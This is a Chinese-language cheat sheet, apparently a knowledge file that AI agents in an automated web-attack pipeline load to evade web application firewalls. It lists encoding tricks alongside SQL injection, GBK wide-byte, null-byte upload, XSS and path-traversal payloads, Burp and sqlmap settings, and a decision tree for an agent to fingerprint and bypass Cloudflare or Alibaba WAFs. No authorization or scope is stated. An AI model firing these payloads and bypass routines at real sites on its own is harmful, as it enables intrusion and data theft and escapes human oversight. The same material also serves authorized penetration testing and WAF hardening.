# Encoding Quick Reference + Extension Recommendations
# 被调用方: AI-2（WAF绕过生成）/ AI-4（Payload变异）/ WAF bypass 或工具选型时
# 加载时机: WAF 检测到拦截时，或 Payload 需要编码转换时读取

---

## 速查：常用编码对照表

### URL 编码

```
字符    URL编码    双重编码   说明
------  ---------  ---------  ------
空格    %20        %2520      SQL注入分隔符常用
'       %27        %2527      SQL单引号
"       %22        %2522      属性注入
<       %3C        %253C      XSS关键字符
>       %3E        %253E      XSS关键字符
(       %28        %2528      函数调用
)       %29        %2529      函数调用
&       %26        %2526      参数分隔
=       %3D        %253D      参数赋值
+       %2B        %252B      URL中的+代表空格
#       %23        %2523      URL片段/SQL注释
/       %2F        %252F      路径分隔
\       %5C        %255C      路径分隔(Windows)
;       %3B        %253B      SQL语句分隔
--      %2D%2D     -          SQL注释（先尝试原始）
0x00    %00        -          Null字节截断
```

### HTML 实体编码

```
字符    命名实体       数字实体     十六进制实体
------  ----------     ----------   ------------
<       &lt;           &#60;        &#x3C;
>       &gt;           &#62;        &#x3E;
"       &quot;         &#34;        &#x22;
'       &apos;         &#39;        &#x27;
&       &amp;          &#38;        &#x26;
空格    &nbsp;         &#32;        &#x20;

用途: XSS注入HTML上下文时绕过< >过滤
示例: &lt;script&gt; → 若被解码后执行则可利用
```

### Base64 速查

```
编码: btoa("payload") 或 base64 -w0
解码: atob("...") 或 base64 -d

常用Base64 payload（预编码）:
  id              → aWQ=
  /etc/passwd     → L2V0Yy9wYXNzd2Q=
  system('id')    → c3lzdGVtKCdpZCcp
  <script>        → PHNjcmlwdD4=
  ' OR 1=1--      → JyBPUiAxPTEtLQ==

Base64变体:
  URL安全Base64: + → -，/ → _，去掉末尾=
  Modified Base64 for URL: RFC 4648
```

### Unicode / 全角字符

```
常用全角字符（WAF常被绕过）:
  空格   → \u3000（全角空格）/ \u00a0（不断空格）
  '      → \u2018（'左单引号）/ \u2019（'右）/ \uff07（全角'）
  "      → \u201c（"）/ \u201d（"）/ \uff02（全角"）
  <      → \uff1c（＜）
  >      → \uff1e（＞）
  (      → \uff08（（）
  )      → \uff09（））
  /      → \uff0f（／）
  \      → \uff3c（＼）

使用场景: 目标应用做了全角→半角转换但WAF不做时
```

---

## 编码组合策略（按WAF类型）

### 通用策略矩阵

```
场景                        → 推荐编码组合
--------------------------  ----------------------------
简单关键词过滤              → 大小写混淆 + 注释插入
URL参数WAF                  → URL编码(一次)
Header/Cookie WAF           → 双重URL编码
JSON body WAF               → Unicode转义 (\u0027 = ')
XML解析器                   → HTML实体编码
中文GBK环境                 → GBK宽字节 (%df%27)
前端过滤/后端不过滤          → 原始字符直接发
多层代理                    → 按代理数量叠加编码层数
```

### GBK 宽字节注入（中文目标专用）

```
原理:
  服务器使用GBK编码，PHP使用 addslashes() 过滤 '
  addslashes 将 ' 转义为 \'（0x5c 0x27）
  GBK中 0xdf 与 0x5c 组合为合法汉字"縗"，消耗掉反斜杠
  最终执行的SQL中 ' 没有被转义

payload: %df%27 (即 DF 27 两个字节)
发送: id=%df%27 OR 1=1--
服务器解码: id=縗' OR 1=1--  ← ' 未被转义

适用: PHP + MySQL(GBK) + magic_quotes/addslashes 的场景
检测: 发送 %df%27 观察是否触发SQL错误（不同于普通 ' 触发的错误）
```

### Null 字节截断

```
适用场景: 
  文件路径处理（C函数 strstr/strcpy 遇到\0截断）
  部分正则表达式 (JS/PHP 的 RegExp 不含 /s 时)

payload: shell.php%00.jpg
  → 写入磁盘时文件名为 shell.php（\0后截断）
  → WAF看到的是 .jpg 文件

URL注入: /api/file?path=/etc/passwd%00.txt
  → 服务端C代码读取 /etc/passwd（%00截断）
  
⚠️ 现代语言(Java/Python/Go)通常不受影响
```

---

## SQL 注入编码速查

```
注释符变体（替代 -- 和 #）:
  --    → -- -（末尾加空格）→ --+（URL中+代表空格）
  #     → %23（URL编码）
  /**/  → 内联注释（可替代空格）
  /*!*/ → MySQL执行注释（版本条件执行）

空格替代:
  /**/  → SEL/**/ECT
  %09   → Tab
  %0a   → 换行
  %0d   → 回车
  %0b   → 垂直Tab
  ()    → SELECT(1)FROM(users)
  +     → 有些数据库支持

引号替代:
  "     → 替代单引号（MySQL双引号模式）
  0x61  → 十六进制 'a'（无引号绕过）
  char(39) → ASCII的单引号
  $$    → PostgreSQL美元符引用

关键字混淆:
  UNION → UnIoN / UN/**/ION / /*!UNION*/
  SELECT → sElEcT / SEL%0aECT
  WHERE → wHeRe
  AND/OR → &&/||（部分DB支持）
```

---

## XSS 编码速查

```
HTML上下文（<标签外）:
  基础: <script>alert(1)</script>
  绕过: <ScRiPt>alert(1)</sCrIpT>  ← 大小写
        <scr<script>ipt>alert(1)</scr</script>ipt>  ← 双写
        <svg onload=alert(1)>
        <img src=x onerror=alert(1)>
        <details open ontoggle=alert(1)>

属性上下文（在value=""中）:
  " onmouseover="alert(1)
  " autofocus onfocus=alert(1)//
  ' onmouseover='alert(1)

JavaScript上下文（在<script>块内）:
  ';alert(1)//
  \';alert(1)//
  </script><script>alert(1)

URL上下文（href/src）:
  javascript:alert(1)
  data:text/html,<script>alert(1)</script>

事件处理器变体（绕过on*过滤）:
  onerror    → onError / ONERROR
  onload     → OnLoad / onLOAD
  onfocus    → onfocusin / onfocusout
  onclick    → ondblclick / onmousedown
  onmouseover → ontouchstart（移动端）

编码执行（eval/atob）:
  eval(atob('YWxlcnQoMSk='))  ← 执行 alert(1) 的 Base64
  eval('\x61\x6c\x65\x72\x74\x281\x29')  ← 十六进制
  setTimeout('alert\x281\x29',0)
```

---

## 路径遍历编码

```
基础: ../../../etc/passwd

编码变体:
  ./ 编码: %2e%2e%2f → ../../
  双重编码: %252e%252e%252f → ../../
  混合: ..%2f..%2f..%2fetc%2fpasswd
  反斜杠: ..\..\..\etc\passwd（Windows）
  Unicode: %c0%ae%c0%ae%c0%af → ../

截断技巧（绕过扩展名检查）:
  ../../../etc/passwd%00.jpg  ← Null截断（旧版PHP）
  ../../../etc/passwd....     ← Windows点截断
  ../../../etc/passwd%20%20   ← 空格截断（Windows）
```

---

## 工具推荐（按场景）

### Burp Suite 扩展

```
编码/解码工具:
  Hackvertor      — 强大的多层编码转换，支持嵌套编码
  Decoder+        — 扩展Decoder功能，支持更多编码格式

WAF绕过:
  bypass-waf      — 自动生成WAF绕过变体
  403-bypasser    — 403绕过专项

注入测试:
  SQLiPy          — SQLMap与Burp集成
  Taborator       — Collaborator增强（OOB测试）
  Turbo Intruder  — 高速并发，竞争条件测试核心工具（AI-8必备）

JWT:
  JWT Editor      — JWT修改/alg:none/密钥混淆
  JOSEPH          — JWT安全测试专项

LLM/AI测试（v3.0新增）:
  LLM Injection Scanner  — 自动化LLM注入检测（社区扩展）
```

### 配套工具

```
编码转换:
  CyberChef (gchq.github.io/CyberChef) — 多层编码转换神器
  命令行: echo -n "payload" | base64 | tr -d '\n'

SQLi自动化（辅助验证）:
  sqlmap --data="" --dbms=mysql --level=5 --risk=3
  注意: AI-10手动验证为主，sqlmap仅辅助确认

字典/payload库:
  SecLists (danielmiessler/SecLists) — 覆盖各类漏洞的payload集合
  PayloadsAllTheThings — SSTI/XXE/SSRF等专项payload
```

---

## AI-2 调用本文件的决策树

```
收到WAF拦截信号（403/406或关键词）
  ↓
查询 SESSION.waf_bypass_learned[waf_fingerprint]
  ↓ 有记录 → 直接复用，跳到Step 4
  ↓ 无记录
WAF指纹识别（响应头/错误页）
  ↓
Cloudflare  → 查本文档"通用策略矩阵" → HTTP/2降级 + Unicode全角
阿里云WAF   → GBK宽字节（中文目标）+ 分块传输
其他/自研   → Level 1 → Level 2 → Level 3 逐级尝试
  ↓
成功绕过 → 更新 SESSION.waf_bypass_learned → 输出[WAF_BYPASS_LEARNED]
失败    → 进入第三阶段迭代 → 发出[HYPOTHESIS_INQUIRY]
```
